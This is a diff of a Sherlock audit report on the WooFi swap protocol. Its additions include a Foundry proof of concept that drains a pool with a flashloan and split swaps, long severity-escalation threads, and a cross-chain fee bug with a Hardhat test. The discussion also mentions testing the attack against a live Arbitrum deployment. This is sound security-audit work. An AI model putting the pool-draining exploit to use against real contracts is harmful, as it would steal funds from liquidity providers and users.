@@ -1,74 +1,95 @@
-# Issue H-1: Oracle price updates can be easily sandwiched for atomic profits 
+# Issue H-1: Pool can be drained 
 
-Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/17 
+Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/68 
 
 The protocol has acknowledged this issue.
 
 ## Found by 
 mstpr-brainbot
 ## Summary
-When the new price is posted by admin to oracle, any MEV searcher can frontrun/sandwich for atomic profits. Such sandwich would mean loss of funds for the supplier of the tokens.
+The pool can be drained just as it was during the incident that occurred previously.
 ## Vulnerability Detail
-Assume USDC is quote token and WOO is base token. WOO does not have a chainlink price feed which means the pricing of WOO will be handled by the WooOracle solely. 
+`maxNotionalSwap` and `maxGamma` and the new math formula do not prevent the pool being drainable. Same attack vector that happent previously is still applicable:
+https://woo.org/blog/en/woofi-spmm-exploit-post-mortem
+https://rekt.news/woo-rekt/
 
-Also assume that the WOO price is 0.5$. However, in off-chain markets, the price of WOO increases to 0.55$ and the oracle is updated by the admin so the oracle update will make the onchain price 0.5$ -> 0.55$.
-
-MEV bot sees the oracle price update tx in mempool, and quickly buys WOO tokens from the pool contract and then sells it for more USDC after the oracle update is completed. At the end, MEV bot achieved to buy WOO tokens from 0.5$ and managed to sell all for 0.55$ in 1 tx. The profit that the MEV bot made is basically a loss to the provider of the WOO tokens in the pool since the WOO tokens are sold to a price that is cheaper than it should be. 
+Flashloan 99989999999999999990000 (99_990) WOO
+Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
+Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
+Repay flashloan, pocket the rest of the 100K WOO.
 
 **Coded PoC:**
 ```solidity
-function test_frontrunOraclePriceUpdate() public {
-        uint usdcAmount = 1_000_000 * 1e6;
-        uint wooAmount = 100_000 * 1e18;
-        deal(USDC, ADMIN, usdcAmount);
-        deal(WOO, ADMIN, wooAmount);
+function test_Exploit() public {
+        // Flashloan 99989999999999999990000 (99_990) WOO
+        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
+        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
+        // Repay flashloan, pocket the rest of the 100K WOO. 
 
+        // Reference values: 
+        // s = 0.1, p = 1, c = 0.0001 
+
+        // bootstrap the pool 
+        uint usdcAmount = 100_0000_0_0000000000000_000;
+        deal(USDC, ADMIN, usdcAmount);
+        deal(WOO, ADMIN, usdcAmount);
+        deal(WETH, ADMIN, usdcAmount);
         vm.startPrank(ADMIN);
         IERC20(USDC).approve(address(pool), type(uint256).max);
         IERC20(WOO).approve(address(pool), type(uint256).max);
+        IERC20(WETH).approve(address(pool), type(uint256).max);
         pool.depositAll(USDC);
         pool.depositAll(WOO);
+        pool.depositAll(WETH);
         vm.stopPrank();
+        ////////////////////////
 
-        assertEq(IERC20(USDC).balanceOf(address(pool)), usdcAmount);
-
-        uint usdcAmountForTapir = 10_000 * 1e6;
+        // fund mr TAPIR
         vm.startPrank(TAPIR);
-        deal(USDC, TAPIR, usdcAmountForTapir);
+        uint wooAmountForTapir = 9999 * 1e18 - 1000;
+        deal(WOO, TAPIR, wooAmountForTapir * 10);
         IERC20(USDC).approve(address(router), type(uint256).max);
         IERC20(WOO).approve(address(router), type(uint256).max);
+        IERC20(WETH).approve(address(router), type(uint256).max);
         vm.stopPrank();
+        ////////////////////////
+        
+        // get the price before the swaps
+        (uint128 price, ) = oracle.woPrice(WOO);
+        console.log("Price before the swap", price);
 
-        // sell USDC for WOO before price update, frontrun, initial price is 0.5
+        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves
+        // partial swaps in same tx will also work and it will be even more profitable! 
+        uint cumulative;
+        for (uint i; i < 10; ++i) {
+            vm.prank(TAPIR);
+            cumulative += router.swap(WOO, USDC, wooAmountForTapir, 0, payable(TAPIR), TAPIR);
+        }
+
+        // how much we bought and what's the final swap? 
+        console.log("USDC bought after swaps", cumulative);
+        (price, ) = oracle.woPrice(WOO);
+        console.log("Price after swap", price);
+
+        // sell 20 USDC, how much WOO we get? (199779801821639475527975)
         vm.prank(TAPIR);
-        uint receivedWOO = router.swap(USDC, WOO, usdcAmountForTapir, 0, payable(TAPIR), TAPIR);
-        console.log("Received WOO", receivedWOO);
+        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(TAPIR), TAPIR);
+        console.log("Received WOO", receivedWOO); // 199779801821639475527975 (10x)
+        console.log("Total WOO flashloaned", wooAmountForTapir * 10); // 99989999999999999990000
 
-        // new price is updated, 0.55
-        vm.prank(ADMIN);
-        oracle.postPrice(WOO, 0.55 * 1e8);
-
-        // immediately sell back 
-        vm.prank(TAPIR);
-        uint receivedUSDC = router.swap(WOO, USDC, receivedWOO, 0, payable(TAPIR), TAPIR);
-        console.log("Received USDC", receivedUSDC);
-
-        // atomic profit
-        assertGe(receivedUSDC, usdcAmountForTapir);
+        // attack is succesfull 
+        assertGe(receivedWOO, wooAmountForTapir * 10);
     }
 ```
 ## Impact
 
 ## Code Snippet
-https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L148-L156
-https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L152-L170
+https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L420-L465
 ## Tool used
 
 Manual Review
 
 ## Recommendation
-Add a buffer that whenever the price is updated the buffer amount of time has to be passed.
-If the oracle updates at t=0, and buffer is 2seconds then the next swap can happen in t=2 to make sure sandwiching is not possible for MEV bots 
 
 
 
@@ -76,8 +97,107 @@ If the oracle updates at t=0, and buffer is 2seconds then the next swap can happ
 
 **fb-alexcq**
 
-- wooracle price update is high-frequent
-- the newly posted k, spread and swap fee, will make the sandwich swap less or non profitable in most cases.
+
+This extreme price-deviation case has already been handled by price check (against Chainlink) in our Wooracle's price function.
+
+
+
+**mstpr**
+
+@fb-alexcq 
+correct, but some tokens like WOO does not have chainlink price feeds in other networks, in that case the attack is feasible
+
+**fb-alexcq**
+
+Thanks for the feedback. 
+
+We already decided to never support any token which are unavailable in Chainlink, right after we got exploited a month ago. And this is the only way to fix it; otherwise, the project cannot run again.
+
+**WangSecurity**
+
+The info about not using tokens that don't have Chainlink price feeds is not in README. Moreover, the README says any standard token. Therefore, aproppriate severity is High.
+
+**WangSecurity**
+
+I've consulted on this issue with the Head of Judging and decided to invalidate it, since such tokens wouln't be used. The README says "any" ERC20 token, therefore, it's expected tokens without the any weird traits will be used.
+
+**mstpr**
+
+Escalate
+
+Every ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as "weird" tokens as per Sherlock:
+https://github.com/d-xo/weird-erc20
+
+Also, the current scope of contracts indeed assumes that there can be tokens used that does not have chainlink price feeds
+https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L247-L255
+
+Additionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.
+
+Also, the deployed chains are as follows in README:
+Arbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea
+There are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc. 
+
+Considering how serious the issue is and the above, this issue should be definitely considered as a high issue.
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> Every ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as "weird" tokens as per Sherlock:
+> https://github.com/d-xo/weird-erc20
+> 
+> Also, the current scope of contracts indeed assumes that there can be tokens used that does not have chainlink price feeds
+> https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L247-L255
+> 
+> Additionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.
+> 
+> Also, the deployed chains are as follows in README:
+> Arbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea
+> There are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc. 
+> 
+> Considering how serious the issue is and the above, this issue should be definitely considered as a high issue.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**WangSecurity**
+
+Agree with everything that tapir says above, but want to note that I've consulted with the head of judging before making this decision. But, I agree that I may have phrased the problem not very clearly and will send what I've said to the head of judging about it.
+
+My message: "in some issues the problem is that tokens don't have chainlink's price feed, but the sponsor says they will only use tokens with the feeds."
+
+The head of judging said this doesn't sound like a vulnerability.
+
+After that I also added: "oh, sorry, I missed for the first one, it allowed to drain the entire pool, but still it required to whitelist tokens without the price feed, which they didn't intend to do." and head of judging is reacted with a thumbs up emoji.
+
+I don't say that tapir is wrong and agree with his reasons, therefore, I will accept it decision from the head of judging. Just wanted to note why it's invalidated.
+
+
+**Czar102**
+
+I think the fact that there are special fragments of code to handle the no oracle cases is a game-changer in this judgment. Without that detail, this would clearly be an admin misconfiguration, but it seems that tokens without a Chainlink feed were intended (or allowed) to be used.
+
+Given that it wasn't noted anywhere (to my best knowledge) that this fragment of the code will never be used, i.e. all whitelisted tokens will have a Chainlink feed, I am planning to consider this a valid High severity issue. 
+
+**WangSecurity**
+
+Great issue @mstpr !
+
+**Czar102**
+
+Result:
+High
+Unique
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [mstpr](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/68/#issuecomment-2039575831): accepted
 
 # Issue M-1: Potential damages due to incorrect implementation of the ````ZIP```` algorithm 
 
@@ -497,6 +617,158 @@ Initially, it was a duplicate of 68, but these are different issues and it prese
 **WangSecurity**
 
 Sponsor said that this AMM model is in fact intended, cause 99% of their swaps are small. But, it wasn't mentioned in the README, therefore, we validate this report as Med due to validation of maxGamma and maxNotionalSwap (core functionality break).
+
+**Banditx0x**
+
+@mstpr I believe the protocol does actually lose funds here:
+
+- The protocol acts as the liquidity provider
+- The net-result for a trader and LP in a trade is zero-sum.
+- If a trader unfairly avoids slippage by gaming the AMM formula, each $ saved by the trader is lost by the LP
+
+Lmk your thoughts
+
+**Banditx0x**
+
+@fb-alexcq in response to something you brought up in issue 20 (duplicate):
+
+> Thanks for the feedback.
+> 
+> Technically it is okay to avoid huge slippage by splitting into small swaps, right? BTW, is there a way for attacker to get profits (instead of saving the loss) from the split swap? Better to consider there's a 2-5 bps swap fee.
+
+I would like to emphasie that although splitting a very large swap into smaller ones reduces slippage in basically all AMM's, this slippage reduction is due to a trade in between swaps arbitraging the price of the AMM back to the correct price in between your multiple swaps. This is a core invariant of all widely used AMM formulas, and has significant second order consequences as detailed in issue #47 .  Woofi's current formula is different from **any** widely used AMM formula in that it requires no -inbetween price corrections to get this slippage discount.
+
+For example, in Uniswap v2, Uniswap v3, Curve, Balancer etc it doesn't matter if you swap 100 tokens or 1 token 100 times. As long as _no transactions happen in between_, the tokens returned will be the same.
+
+I'd highly reccomend going back to the old formula which was consistent with this invariant unless it allows another type of vulnerability.
+
+**Banditx0x**
+
+Escalate. 
+
+I think it's high severity for above reasons.
+
+Please consider this issue along with the reasoning provided in #47 . I believe me and @mstpr are providing different perspectives to the issue despite the same root cause. 
+
+Note that #47 demonstrates an example with a 2% slippage, and will continue to apply at lower slippage %'s so this actually applies even when 99% of the swaps are small.
+
+> Seems like you're not considering the swap fee
+
+Addressing this: the swap fee is a percentage of the swap size. Therefore splitting a swap into multiple smaller swaps will result in basically the same sum of swap fees.
+
+The formula allows certain users (one's that optimise and perfectly calculate swap splitting) a lower slippage. Normal users that use the User Interface or don't perfectly calculate their split sizes don't get the same privilege. Giving extremely advanced users lower AMM prices than everybody else is equivalent to loss of funds for the not-so-savvy swappers.
+
+**sherlock-admin2**
+
+> Escalate. 
+> 
+> I think it's high severity for above reasons.
+> 
+> Please consider this issue along with the reasoning provided in #47 . I believe me and @mstpr are providing different perspectives to the issue despite the same root cause. 
+> 
+> Note that #47 demonstrates an example with a 2% slippage, and will continue to apply at lower slippage %'s so this actually applies even when 99% of the swaps are small.
+> 
+> > Seems like you're not considering the swap fee
+> 
+> Addressing this: the swap fee is a percentage of the swap size. Therefore splitting a swap into multiple smaller swaps will result in basically the same sum of swap fees.
+> 
+> The formula allows certain users (one's that optimise and perfectly calculate swap splitting) a lower slippage. Normal users that use the User Interface or don't perfectly calculate their split sizes don't get the same privilege. Giving extremely advanced users lower AMM prices than everybody else is equivalent to loss of funds for the not-so-savvy swappers.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**mstpr**
+
+@Banditx0x 
+
+If this is design choice, then someone making partial swaps will get more tokens, and yes, this would be loss of funds. Additionally, the maxGamma and maxNotionalSwap can easily be bypassed. 
+
+Example:
+If selling 10 base tokens should receive 5 quote tokens, and if someone selling 2-2-2-2-2 base tokens and receives 7 quote tokens at the end, than the 2 quote tokens would be the loss of protocol since they don't want this to happen in their AMM. Hence, high could be considered. 
+
+I think you are right with your comments, if this is design choice, then high would be appropriate. 
+
+**WangSecurity**
+
+I believe it should remain medium cause, essentially, it is expected behaviour by the protocol which was confirmed by the sponsor. But, I believe breaking maxGamma and maxNotionalSwap is breaking core functionality, therefore, it's medium and not enough for a high. 
+
+I don't say that watsons above are wrong, I see and understand their points and will accept any decision by the head of judging.
+
+**Czar102**
+
+Kudos to @Banditx0x @mstpr for the deep understanding of the math.
+
+As much as I like this finding, I don't think it presents a loss of funds per se, and there are no earnings to the "exploiters", the total (and marginal!) slippage still increases as more volume goes in any way. This is a math inconsistency, and I would be considering it as a borderline Low/Medium severity issue.
+
+Given that an escalation only exists to increase the severity, I'm planning to reject it and leave the issue as is, and I will not consider downgrading this issue.
+
+**fb-alexcq**
+
+@mstpr @Banditx0x   thanks for detailed follow and explanation.
+
+Could you please send me the whole file of your foundry test, so that I can run it here in my environment?  so that to better verify your raised issues.
+
+BTW, could you also try your attach vector on our newly deployed WooPP going live this Monday?  https://arbiscan.io/address/0xed9e3f98bbed560e66b89aac922e29d4596a9642 
+Is that possible to profit or swap for more tokens here in our new version?
+
+
+**mstpr**
+
+@fb-alexcq 
+I plugged in the numbers from deployment to my desmos graph. With current values, if someone swaps 14_350 BTC they get "0" usdc token in exchange.
+
+Another example:
+if you sell 1M USDC in one go you get:
+14.41563574 WBTC
+
+if you sell 1M USDC in 1000 iterations (1000, 1000, 1000....) you get:
+14.42278414 WBTC
+
+the difference is 0.0071484 WBTC, 500$ 
+
+test (directly points the current deployment shared above) 
+https://gist.github.com/mstpr/0a099688cb48cdc6bec42ceb1c322e8c
+
+**fb-alexcq**
+
+OK. Cool, Thanks.
+
+This result is with Chainlink Oracle Guardian (+-5%) set up right ?
+
+
+**mstpr**
+
+> Kudos to @Banditx0x @mstpr for the deep understanding of the math.
+> 
+> As much as I like this finding, I don't think it presents a loss of funds per se, and there are no earnings to the "exploiters", the total (and marginal!) slippage still increases as more volume goes in any way. This is a math inconsistency, and I would be considering it as a borderline Low/Medium severity issue.
+> 
+> Given that an escalation only exists to increase the severity, I'm planning to reject it and leave the issue as is, and I will not consider downgrading this issue.
+
+What about looking at this angle? 
+
+If this is design choice, then swapping 1M USDC should result at 10 BTC. However, if you swap partially up to 1M USDC then you will end up with say 100 BTC. This 90 BTC difference is basically loss of funds for Woofi considering their design choice, right? 
+
+**Czar102**
+
+@mstpr this is not a design choice, this is a math inconsistency, as I noted above.
+
+As long as "it's fine" for the user to get 100 BTC for 1m USDC, then it's not loss of funds, but suboptimal strategy of the 1M USDC <> 10 BTC swapper. But given that the discrepancy in this case is rather minimal (we won't have 90% slippage), I stand by my previous comment.
+
+**Czar102**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [banditx0x](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/20/#issuecomment-2039268858): rejected
 
 # Issue M-3: Price manipulation by swapping any ````baseToken```` with itself 
 
@@ -1079,12 +1351,16 @@ We decided to give the credit to the Watson. And have been come up with this fix
 In engineering perspective, it's impossible to deduce a zero gamma, but we decided to take more sanity check here , w/o costing too much gas.
 
 
+**Banditx0x**
+
+Interesting, I saw that gamma rounding could be infavor of user but didn't think it could result in anything signficant as it would only be off by 1. Nice one
+
 # Issue M-6: `WooCrossChainRouterV4.crossSwap()` doesn't correctly check for slippage 
 
 Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/85 
 
 ## Found by 
-hals
+charles\_\_cheerful, hals
 ## Summary
 
 `WooCrossChainRouterV4.crossSwap()` doesn't correctly check for slippage, as it deducts external swapping fees after checking for the minimum bridged amount determined by the user.
@@ -1243,7 +1519,470 @@ The protocol team fixed this issue in PR/commit https://github.com/woonetwork/Wo
 
 Initially, it was selected as a duplicate of 141, but it's not. 141 is invalid and 85 is valid.
 
-# Issue M-7: In the function _handleERC20Received, the fee was incorrectly charged 
+**sherlock-admin2**
+
+> Escalate. 
+> 
+> Please think about the actual impact.
+
+You've deleted an escalation for this issue.
+
+# Issue M-7: Medium5-CrossChainWETHSwapFeesChargedUnnecesarily 
+
+Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/95 
+
+## Found by 
+charles\_\_cheerful
+### by [CarlosAlegreUr](https://github.com/CarlosAlegreUr)
+
+## Summary
+
+When doing a cross-chain transfer with any valid `fromToken`, using `sgETH` as `bridgeToken` and **WETH** as `toToken` via the
+`WooRouterV2` swap on destination chain. The user is charged an unnecessary fee. 
+
+## Vulnerability Detail
+
+When receiving a cross-chain swap trhough `sgReceive()` at `WooCrossChainRouterV4`, if the `bridgeToken` is **sgETH** then the `_handleNativeReceived()` will be called. This function if `toToken != ETH_PLACEHOLDER_ADDR` will perform a swap to change the eth used as `bridgeToken` for the `toToken` using, for example, the very same `WooRouterV2`. And for exchanging ETH it needs to be wrapped up as **WETH** which it does by calling `IWETH(weth).deposit{value: bridgedAmount}();`.
+
+The problem comes when the `toToken` desired is **WETH**, then a ***WETH to WETH*** swap will be carried out by the `WooRouterV2` which will result in a fee being charged to the user due to a swap which makes no sense but would execute. So the user is losing unnecessary unexpected money.
+
+You can see that `WooRouterV2` allows for swaps where `from` and `to` tokens are the same token exeuting the following code:
+
+<details>
+<summary>See swap the same `from` and `to` tokens via WooRouterV2 👁️</summary>
+
+To run the code copy paste it inside the `./test/typesript/WooRouterV2.test.sol` file, then inside the `describe("Swap Functions", () => {})`, and then after the `beforeEach("Deploy WooRouterV2", async () => {})`, and then run:
+
+```bash
+npx hardhat test test/typescript/WooRouterV2.test.ts
+```
+
+```typescript
+    it.only("swap btc -> btc", async () => {
+      await btcToken.mint(user.address, ONE.mul(5));
+      console.log("POOL BTC BALANCE", await utils.formatEther(await btcToken.balanceOf(wooPP.address)));
+      console.log("Swap: btc -> btc");
+      const fromAmount = ONE.mul(2);
+      const minToAmount = ONE.mul(1);
+      await btcToken.connect(user).approve(wooRouter.address, fromAmount);
+      await wooRouter
+        .connect(user)
+        .swap(btcToken.address, btcToken.address, fromAmount, minToAmount, user.address, ZERO_ADDR);
+      console.log("POOL BTC BALANCE", await utils.formatEther(await btcToken.balanceOf(wooPP.address)));
+      console.log("That means from the 2 BTC user sent only 0.002 were left as fee.");
+      console.log("What matters for our issue is that the tx succeeded and a fee was taken.");
+    });
+```
+
+</details>
+
+> 📘 **Note** ℹ️: The cross-chain tx described is feasible as there is no kind of `require(toToken != WETH && brdigeToken != sgETH)` anywhere.
+
+> 🚧 **Note** ⚠️: I'm not sure what would happen if choosing **1inch** option. If the swaps go through this problem would apply. But if the tx reverts this problem wouldn't apply as the swapping fee of **1inch** wouldn't be applied and the transfer of `bridgeAmount`
+would take place as expected. Due to personal lack of time I let this question open. Anyway the recommendation proposed would fix the problem too in case **1inch** also allows execution of the unnecessary swap.
+
+## Impact
+
+Users lose unnecessary money when doing a cross-chain transfer with `sgETH` as `bridgeToken` and **WETH** as `toToken` via the `WooRouterV2` swap on detination chain.
+
+## Code Snippet
+
+- [_handleNativeReceived() deposit WETH to later perform swap](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L299)
+
+- [_handleNativeReceived() can execute swap through router](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L349)
+
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+
+At `_handleNativeReceived()`. In the case of bridging with **sgETH**, after the  `if(toToken == ETH_PLACEHOLDER_ADDR){}`, add an extra if that checks if **toToken != WETH**, and if they are indeed different proceed with the swap.
+
+```diff
+       if (toToken == ETH_PLACEHOLDER_ADDR) {
+         // code for when no swap required...
+        }
+
+        IWETH(weth).deposit{value: bridgedAmount}();
+
++       if (toToken != WETH) {
+            // Swap required!
+            // Swap logic...
++        }else{
++           // send the WETH
++       }
+```
+
+            
+
+
+
+## Discussion
+
+**sherlock-admin2**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**WangAudit** commented:
+> technically yes; it's WETH to WETH; but the user want to exchange another token (e.g.sgETH) to WETH; therefore; the fees are taken cause the user initially swaps not-WETH to WETH
+
+
+
+**CarlosAlegreUr**
+
+Escalate
+
+I think I undertand where your point comes from, but I think it's wrong for the following reasons.
+
+The way your comment is wrong is that actually if using `sgEth` as `bridgeToken`, even though its a token and thus a swap should be made to WETH and thus charge the fee and thus be valid as you say, even though that, the thing is that bridged `sgEth` doesnt arrive to the `CrossChainRouterV4` contract as a token but already as a native coin in `msg.value`. Thus when using `sgETH` as `bridgeToken`
+you are, a bit confusingly, not actually receiving a ERC20 token but native coin. You can see that this is true carefully looking at the code:
+
+When `sgReceive()` is called and `bridgedToken=sgETH` we can see that the value being sent is not actualy sgETH token but pure ETH as `msg.value`.
+
+That is why the code does the following, first in `sgReceive()`:
+[See code in repo click here](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L174)
+[Notice the dev team added a comment pointing out what I'm trying to explain here. Click to see.](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L175)
+```solidity
+if (bridgedToken == sgInfo.sgETHs(sgInfo.sgChainIdLocal())) {
+            // 🟢 The comment below this one was added by the dev team and also informs that when sgETH, native token (coin) is received
+            // bridgedToken is SGETH, received native token
+            _handleNativeReceived(refId, to, toToken, amountLD, minToAmount, dst1inch);
+}
+```
+If `sgEth` is used, `_handleNativeReceived()` is called, and then inside `_handleNativeReceived()`:
+
+[See code in repo click here](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L279)
+
+```solidity
+   ) internal {
+        address msgSender = _msgSender();
+
+        if (toToken == ETH_PLACEHOLDER_ADDR) {
+            // Directly transfer ETH
+            TransferHelper.safeTransferETH(to, bridgedAmount);
+            emit WooCrossSwapOnDstChain(/*event args*/);
+            return;
+        }
+    // (rest of code...)
+```
+
+You can see that the very first action taken is to check if you wanted native coin on destination chain, and if so, transfer it to you and then `return;`. This is because the `sgETH` is sent to the router as already native coin in `msg.value` and not as a token itself.
+
+That is why there is no **sgETH -> WETH** swap and thus the unnecesarry **WETH -> WETH** swap in WooFi will execute as explained in the issue thus charging valid users fees that shouldnt be charged.
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> I think I undertand where your point comes from, but I think it's wrong for the following reasons.
+> 
+> The way your comment is wrong is that actually if using `sgEth` as `bridgeToken`, even though its a token and thus a swap should be made to WETH and thus charge the fee and thus be valid as you say, even though that, the thing is that bridged `sgEth` doesnt arrive to the `CrossChainRouterV4` contract as a token but already as a native coin in `msg.value`. Thus when using `sgETH` as `bridgeToken`
+> you are, a bit confusingly, not actually receiving a ERC20 token but native coin. You can see that this is true carefully looking at the code:
+> 
+> When `sgReceive()` is called and `bridgedToken=sgETH` we can see that the value being sent is not actualy sgETH token but pure ETH as `msg.value`.
+> 
+> That is why the code does the following, first in `sgReceive()`:
+> [See code in repo click here](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L174)
+> [Notice the dev team added a comment pointing out what I'm trying to explain here. Click to see.](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L175)
+> ```solidity
+> if (bridgedToken == sgInfo.sgETHs(sgInfo.sgChainIdLocal())) {
+>             // 🟢 The comment below this one was added by the dev team and also informs that when sgETH, native token (coin) is received
+>             // bridgedToken is SGETH, received native token
+>             _handleNativeReceived(refId, to, toToken, amountLD, minToAmount, dst1inch);
+> }
+> ```
+> If `sgEth` is used, `_handleNativeReceived()` is called, and then inside `_handleNativeReceived()`:
+> 
+> [See code in repo click here](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L279)
+> 
+> ```solidity
+>    ) internal {
+>         address msgSender = _msgSender();
+> 
+>         if (toToken == ETH_PLACEHOLDER_ADDR) {
+>             // Directly transfer ETH
+>             TransferHelper.safeTransferETH(to, bridgedAmount);
+>             emit WooCrossSwapOnDstChain(/*event args*/);
+>             return;
+>         }
+>     // (rest of code...)
+> ```
+> 
+> You can see that the very first action taken is to check if you wanted native coin on destination chain, and if so, transfer it to you and then `return;`. This is because the `sgETH` is sent to the router as already native coin in `msg.value` and not as a token itself.
+> 
+> That is why there is no **sgETH -> WETH** swap and thus the unnecesarry **WETH -> WETH** swap in WooFi will execute as explained in the issue thus charging valid users fees that shouldnt be charged.
+
+The escalation could not be created because you are not exceeding the escalation threshold.
+
+You can view the required number of additional valid issues/judging contest payouts in your Profile page,
+in the [Sherlock webapp](https://app.sherlock.xyz/audits/).
+
+
+**WangSecurity**
+
+Escalate
+
+After additional discussions in discord, I admit that there is something I miss about this one. Therefore, escalating on behalf of @CarlosAlegreUr , after he provides additional comments from discord, I will give my reasons why it should remain invalid and leave the decision to the head of judging.
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> After additional discussions in discord, I admit that there is something I miss about this one. Therefore, escalating on behalf of @CarlosAlegreUr , after he provides additional comments from discord, I will give my reasons why it should remain invalid and leave the decision to the head of judging.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**CarlosAlegreUr**
+
+> Escalate
+> 
+> After additional discussions in discord, I admit that there is something I miss about this one. Therefore, escalating on behalf of @CarlosAlegreUr , after he provides additional comments from discord, I will give my reasons why it should remain invalid and leave the decision to the head of judging.
+
+#95 Final escalation and thanks WangSecurity for your time, effort and kindness.
+
+Summing up discord discussion with WangSecurity (lead judge) and Tapir (another contestant).
+
+There are 4 main reasons why this issue has been considered invalid (from discord chat):
+
+1. To me it looks like design advice honestly. It's a good find honestly, but it's an issue about improving user experience.
+2. The loss is small and finite. 
+3. It's just complicating the code.
+4. Using WETH as `toToken` swap might not be a "core" functonality.
+
+I disagree reagarding 1, I potentially agree with number 2 but it depends on how Serlok defines small and finite, I disagree with 3 && 4. The counterarguments and reasons why I disagree are written after the summary of the issue.
+
+---
+
+First lets summarize the issue: The issue is that the user will be charged a fee he shouldn't when chosing to cross-swap `WETH` as `toToken` using `WooPP` as the exchange for the final swap in **dstChain** and `sgEth` as `bridgeToken`.
+
+(from discord chat)
+Mmmm I will try to explain it again.
+
+First when receiving `sgETH` the contract doesn't receive the ERC20 but diretly receives, from the bridge, native coin through `msg.value`.
+
+Now lets remember the inputs:
+
+`fromToken` => any
+`birdgeToken` => `sgEth`
+`toToken` => `WETH`
+`dst1inch.swapRouter` = WooPP pool
+
+
+Because `bridgeToken` is `sgETH` the `_handleNativeReceived()` function will be executed as you can see in this if statement [here](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L174).
+
+Now inside `_handleNativeReceived()` there are two possible main paths, whether you want native coin and [this block of code](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L279) gets executed and transfers `msg.value` to you and returns, OR, the `msg.value` is wrapped up latter to procced with the swap `bridgeToken => toToken`.
+
+Wrap happens after the if, [here](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L299).
+
